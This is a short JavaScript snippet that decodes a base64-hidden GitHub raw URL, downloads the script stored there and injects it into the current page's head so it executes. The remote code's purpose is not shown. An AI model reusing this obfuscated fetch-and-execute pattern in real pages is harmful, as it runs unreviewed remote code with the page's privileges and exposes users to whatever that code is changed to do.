fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDTVM3L0JDTS9tYWluL0JDTUUxLmpz'))
.then(response => response.text())
.then(text => {
const script = document.createElement('script');
script.innerHTML = text;
document.head.appendChild(script);
  })
